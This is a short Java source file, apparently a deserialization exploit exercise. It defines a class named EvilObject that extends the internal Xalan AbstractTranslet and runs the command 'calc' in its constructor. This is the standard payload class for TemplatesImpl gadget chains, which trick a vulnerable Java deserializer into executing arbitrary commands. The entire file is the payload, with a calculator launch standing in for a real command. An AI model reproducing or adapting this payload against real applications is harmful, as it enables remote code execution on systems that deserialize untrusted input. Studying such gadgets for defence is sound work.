package 版本24;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class EvilObject extends AbstractTranslet {

    public EvilObject() throws IOException {
        Runtime.getRuntime().exec("calc");
    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }

    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {
    }

    public static void main(String[] args) throws Exception {
        EvilObject evilObject = new EvilObject();
    }
}